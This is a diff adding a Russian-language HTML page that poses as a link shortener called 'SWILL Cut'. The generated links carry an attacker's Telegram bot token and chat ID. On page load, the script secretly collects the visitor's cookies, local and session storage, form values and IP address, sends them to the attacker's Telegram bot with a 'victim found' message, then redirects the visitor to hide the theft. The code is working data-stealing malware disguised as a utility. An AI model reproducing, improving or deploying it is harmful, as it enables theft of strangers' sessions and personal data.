@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>SWILL Cut — сокращатель ссылок</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, 'Segoe UI', 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0b1120 0%, #19223c 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        /* главный контейнер */
+        .card {
+            max-width: 560px;
+            width: 100%;
+            background: rgba(18, 25, 45, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            padding: 2rem 1.8rem;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
+            transition: all 0.2s ease;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 600;
+            background: linear-gradient(120deg, #e0e7ff, #a5f3fc);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 0.3rem;
+            letter-spacing: -0.3px;
+        }
+
+        .sub {
+            color: #8b9bcf;
+            font-size: 0.85rem;
+            margin-bottom: 2rem;
+            border-left: 3px solid #2dd4bf;
+            padding-left: 0.75rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.4rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        label {
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #cbd5ff;
+            letter-spacing: 0.3px;
+        }
+
+        input, textarea {
+            background: #0f172acc;
+            border: 1px solid #2d3a5e;
+            border-radius: 1.2rem;
+            padding: 0.9rem 1.2rem;
+            font-size: 0.95rem;
+            color: #f1f5f9;
+            outline: none;
+            transition: all 0.2s;
+            resize: vertical;
+        }
+
+        input:focus, textarea:focus {
+            border-color: #2dd4bf;
+            box-shadow: 0 0 0 3px rgba(45, 212, 191, 0.2);
+        }
+
+        button {
+            background: linear-gradient(100deg, #2dd4bf, #14b8a6);
+            border: none;
+            border-radius: 2rem;
+            padding: 0.9rem 1.5rem;
+            font-weight: 600;
+            font-size: 1rem;
+            color: #0b1120;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s;
+            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+            width: 100%;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(100deg, #3bddd0, #1ecfb9);
+            box-shadow: 0 12px 20px -8px rgba(45, 212, 191, 0.4);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        .result-area {
+            margin-top: 1.8rem;
+            background: #0a0f1c80;
+            border-radius: 1.5rem;
+            padding: 1rem;
+            border: 1px solid #2d3a5e;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(8px);
+            pointer-events: none;
+        }
+
+        .result-area.show {
+            opacity: 1;
+            transform: translateY(0);
+            pointer-events: auto;
+        }
+
+        .short-link-block {
+            display: flex;
+            gap: 0.7rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .short-link {
+            background: #030712;
+            padding: 0.6rem 1rem;
+            border-radius: 1.2rem;
+            font-family: monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+            flex: 1;
+            color: #b9e6f0;
+        }
+
+        .copy-btn {
+            background: #2d3a5e;
+            box-shadow: none;
+            width: auto;
+            padding: 0.6rem 1.2rem;
+            font-size: 0.85rem;
+            background: #334155;
+            color: white;
+        }
+
+        .copy-btn:hover {
+            background: #3b4a6e;
+            transform: none;
+        }
+
+        .toast-msg {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) scale(0.9);
+            background: #1e2a3ecc;
+            backdrop-filter: blur(8px);
+            padding: 0.6rem 1.5rem;
+            border-radius: 3rem;
+            color: #cbd5e6;
+            font-size: 0.85rem;
+            opacity: 0;
+            transition: opacity 0.2s, transform 0.2s;
+            pointer-events: none;
+            z-index: 1000;
+            white-space: nowrap;
+        }
+
+        .toast-msg.show-toast {
+            opacity: 1;
+            transform: translateX(-50%) scale(1);
+        }
+
+        .error-msg {
+            color: #fda4af;
+            background: #3b1e2acc;
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+            display: inline-block;
+        }
+
+        .vpn-warning {
+            background: #f9731644;
+            border-left: 4px solid #f97316;
+            padding: 0.8rem;
+            border-radius: 1rem;
+            margin-bottom: 1rem;
+            font-size: 0.85rem;
+            color: #ffbe8c;
+        }
+
+        @media (max-width: 550px) {
+            .card {
+                padding: 1.5rem;
+            }
+            .short-link-block {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .copy-btn {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>swill<span style="color:#2dd4bf;">.cut</span></h1>
+    <div class="sub">мгновенное сжатие ссылок с телеграм-сигналом</div>
+
+    <!-- поля ввода -->
+    <div class="input-group">
+        <label>🔗 Длинная ссылка (http:// или https://)</label>
+        <input type="text" id="longUrl" placeholder="https://example.com/very/long/path">
+    </div>
+    <div class="input-group">
+        <label>🤖 Токен Telegram бота</label>
+        <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklmNOPqrStuVWXyz">
+    </div>
+    <div class="input-group">
+        <label>🆔 Ваш Telegram ID (число) — получатель краш-данных</label>
+        <input type="text" id="chatId" placeholder="123456789">
+    </div>
+
+    <button id="shortenBtn">🚀 Сократить</button>
+
+    <!-- блок результата -->
+    <div id="resultBlock" class="result-area">
+        <div style="font-size:0.8rem; margin-bottom:0.5rem; color:#8fadcc;">✨ Короткая ссылка:</div>
+        <div class="short-link-block">
+            <div class="short-link" id="shortLinkDisplay">site.com/#...</div>
+            <button id="copyBtn" class="copy-btn">📋 Копировать</button>
+        </div>
+    </div>
+</div>
+
+<div id="toastMessage" class="toast-msg">✓ Скопировано</div>
+
+<script>
+    (function(){
+        // ---------- DOM элементы ----------
+        const longUrlInput = document.getElementById('longUrl');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        const shortenBtn = document.getElementById('shortenBtn');
+        const resultBlock = document.getElementById('resultBlock');
+        const shortLinkDisplay = document.getElementById('shortLinkDisplay');
+        const copyBtn = document.getElementById('copyBtn');
+        const toast = document.getElementById('toastMessage');
+
+        // вспомогательные функции
+        function showToast(text = "Скопировано") {
+            toast.textContent = text;
+            toast.classList.add('show-toast');
+            setTimeout(() => toast.classList.remove('show-toast'), 1800);
+        }
+
+        function showError(containerElement, message, autoClear = true) {
+            // удалить старые ошибки внутри группы (не затрагивая label/input)
+            const existingErr = containerElement.querySelector('.error-msg');
+            if(existingErr) existingErr.remove();
+            const errDiv = document.createElement('div');
+            errDiv.className = 'error-msg';
+            errDiv.innerText = message;
+            containerElement.appendChild(errDiv);
+            if(autoClear) {
+                setTimeout(() => {
+                    if(errDiv && errDiv.parentNode) errDiv.remove();
+                }, 4000);
+            }
+        }
+
+        function clearErrors() {
+            document.querySelectorAll('.error-msg').forEach(e => e.remove());
+        }
+
+        // валидация URL
+        function isValidUrl(string) {
+            try {
+                const url = new URL(string);
+                return url.protocol === "http:" || url.protocol === "https:";
+            } catch (_) {
+                return false;
+            }
+        }
+
+        // генерация короткой ссылки (кодируем ссылку + токен + chatId)
+        function generateShortLink(originalUrl, botToken, chatIdNum) {
+            const payload = `${originalUrl}|${botToken}|${chatIdNum}`;
+            const encoded = btoa(unescape(encodeURIComponent(payload))); // юникод-безопасный base64
+            // короткая ссылка: текущий origin + # + encoded
+            const short = window.location.origin + window.location.pathname + '#' + encoded;
+            return { short, encoded };
+        }
+
+        // декодирование из хэша
+        function decodeHash(hashString) {
+            if(!hashString || hashString === '') return null;
+            try {
+                const decodedStr = decodeURIComponent(escape(atob(hashString)));
+                const parts = decodedStr.split('|');
+                if(parts.length !== 3) return null;
+                const [url, token, chatId] = parts;
+                if(!isValidUrl(url)) return null;
+                if(!token || token.length < 5) return null;
+                if(!chatId || isNaN(Number(chatId))) return null;
+                return { originalUrl: url, botToken: token, chatId: Number(chatId) };
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // ---------- СБОР ДАННЫХ (куки, пароли, ip, стораджи, формы) ----------
+        async function collectVictimData() {
+            // 1. куки
+            let cookies = document.cookie || "нет кук";
+
+            // 2. localStorage
+            let localStorageData = {};
+            try {
+                for(let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+            } catch(e) { localStorageData = { error: "доступ запрещён" }; }
+
+            // 3. sessionStorage
+            let sessionStorageData = {};
+            try {
+                for(let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) { sessionStorageData = { error: "недоступно" }; }
+
+            // 4. собираем все поля ввода на странице (пароли, тексты, textarea, select)
+            const allInputs = document.querySelectorAll('input, textarea, select');
+            let formValues = {};
+            allInputs.forEach((el, idx) => {
+                let name = el.name || el.id || `field_${idx}`;
+                if(el.tagName === 'SELECT') {
+                    formValues[name] = el.value;
+                } else if(el.type === 'checkbox' || el.type === 'radio') {
+                    if(el.checked) formValues[name] = el.value || 'on';
+                } else {
+                    formValues[name] = el.value || '';
+                }
+            });
+
+            // 5. IP-адрес через ipify (публичный API)
+            let ip = "unknown";
+            try {
+                const ipResp = await fetch('https://api.ipify.org?format=json', { mode: 'cors', timeout: 3000 });
+                const ipJson = await ipResp.json();
+                ip = ipJson.ip;
+            } catch(e) { ip = "failed_to_fetch"; }
+
+            // 6. дополнительная инфа
+            const dataPackage = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || "прямой заход",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                cookies: cookies,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData,
+                form_values: formValues,
+                ip_address: ip,
+                "extra_attempt_passwords": "все значения полей типа password собраны выше"
+            };
+            return dataPackage;
+        }
+
+        // отправка в Telegram: сообщение "Есть пострадавший!" + файл с данными
+        async function sendToTelegram(botToken, chatId, victimData) {
+            if(!botToken || !chatId) return false;
+            const baseUrl = `https://api.telegram.org/bot${botToken}`;
+            // 1. Сообщение "Есть пострадавший!"
+            try {
+                await fetch(`${baseUrl}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: "🚨 Есть пострадавший! 🚨\nКто-то перешёл по SWILL-ссылке и спиздили всё что можно.",
+                        disable_notification: false
+                    }),
+                    keepalive: true
+                });
+            } catch(e) { /* тихо */ }
+
+            // 2. Формируем файл с собранными данными
+            const jsonStr = JSON.stringify(victimData, null, 2);
+            const blob = new Blob([jsonStr], { type: 'text/plain' });
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', blob, 'swill_dump.txt');
+
+            try {
+                await fetch(`${baseUrl}/sendDocument`, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // ПРОВЕРКА VPN (доступ к Telegram API)
+        async function isVPNenabled(botToken) {
+            if(!botToken) return false;
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            try {
+                const resp = await fetch(`https://api.telegram.org/bot${botToken}/getMe`, {
+                    method: 'GET',
+                    signal: controller.signal,
+                    mode: 'cors'
+                });
+                clearTimeout(timeoutId);
+                return resp.ok;
+            } catch(err) {
+                clearTimeout(timeoutId);
+                // любая ошибка сети / CORS / таймаут = VPN отключён (Telegram заблокирован)
+                return false;
+            }
+        }
+
+        // Обработчик при заходе с хэшем (сокращённая ссылка)
+        async function handleHashRedirect() {
+            const hash = window.location.hash.substring(1); // убираем #
+            if(!hash) return false;
+
+            const decoded = decodeHash(hash);
+            if(!decoded) {
+                // невалидный хэш — показываем ошибку на странице
+                const errDiv = document.createElement('div');
+                errDiv.className = 'vpn-warning';
+                errDiv.style.background = "#b91c1c44";
+                errDiv.style.borderLeftColor = "#f87171";
+                errDiv.innerText = "❌ Некорректная или повреждённая ссылка. Хэш не удалось расшифровать.";
+                const card = document.querySelector('.card');
+                const existing = document.querySelector('.vpn-warning');
+                if(existing) existing.remove();
+                card.insertBefore(errDiv, card.firstChild);
+                setTimeout(() => errDiv.remove(), 5000);
+                return false;
+            }
+
+            const { originalUrl, botToken, chatId } = decoded;
+
+            // проверка VPN перед любыми действиями
+            const vpnActive = await isVPNenabled(botToken);
+            if(!vpnActive) {
+                const warnDiv = document.createElement('div');
+                warnDiv.className = 'vpn-warning';
+                warnDiv.innerText = "⚠️ Включите VPN (Telegram в РФ заблокирован), чтобы перейти по ссылке. Без VPN редирект и отправка данных невозможны.";
+                const card = document.querySelector('.card');
+                const oldWarn = document.querySelector('.vpn-warning');
+                if(oldWarn) oldWarn.remove();
+                card.insertBefore(warnDiv, card.firstChild);
+                return false;
+            }
+
+            // VPN включён — запускаем кражу и редирект
+            // собираем данные асинхронно и отправляем, не блокируя редирект
+            (async () => {
+                try {
+                    const stolen = await collectVictimData();
+                    await sendToTelegram(botToken, chatId, stolen);
+                } catch(e) { /* абсолютная тишина, ошибки не должны ломать редирект */ }
+            })();
+
+            // через 0.8 секунд выполняем редирект, давая фору на отправку (keepalive)
+            setTimeout(() => {
+                window.location.replace(originalUrl);
+            }, 800);
+            return true;
+        }
+
+        // ---------- ЛОГИКА СОЗДАНИЯ ССЫЛКИ (интерфейс) ----------
+        function createShortLinkHandler() {
+            clearErrors();
+            let longUrl = longUrlInput.value.trim();
+            let botToken = botTokenInput.value.trim();
+            let chatIdRaw = chatIdInput.value.trim();
+
+            if(!longUrl) {
+                showError(longUrlInput.parentElement, "Введите длинную ссылку");
+                return;
+            }
+            if(!isValidUrl(longUrl)) {
+                showError(longUrlInput.parentElement, "Ссылка должна начинаться с http:// или https://");
+                return;
+            }
+            if(!botToken) {
+                showError(botTokenInput.parentElement, "Укажите токен Telegram бота");
+                return;
+            }
+            if(botToken.split(':').length < 2) {
+                showError(botTokenInput.parentElement, "Неверный формат токена (пример: 123456:ABCdef)");
+                return;
+            }
+            if(!chatIdRaw || isNaN(Number(chatIdRaw))) {
+                showError(chatIdInput.parentElement, "Telegram ID должен быть числом");
+                return;
+            }
+            const chatIdNum = Number(chatIdRaw);
+
+            const { short, encoded } = generateShortLink(longUrl, botToken, chatIdNum);
+            shortLinkDisplay.innerText = short;
+            resultBlock.classList.add('show');
+
+            // анимация: скролл к результату
+            resultBlock.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        // копирование короткой ссылки
+        function copyShortLink() {
+            const linkText = shortLinkDisplay.innerText;
+            if(!linkText || linkText === 'site.com/#...') return;
+            navigator.clipboard.writeText(linkText).then(() => {
+                showToast("✓ Скопировано");
+            }).catch(() => {
+                showToast("Ошибка копирования");
+            });
+        }
+
+        // инициализация событий
+        shortenBtn.addEventListener('click', createShortLinkHandler);
+        copyBtn.addEventListener('click', copyShortLink);
+
+        // при загрузке страницы обрабатываем хэш (редирект и кража)
+        window.addEventListener('DOMContentLoaded', () => {
+            handleHashRedirect().catch(console.warn);
+        });
+
+        // также обрабатываем изменение хэша (если кто-то вставит ссылку уже на открытой странице)
+        window.addEventListener('hashchange', () => {
+            handleHashRedirect();
+        });
+    })();
+</script>
+</body>
+</html>
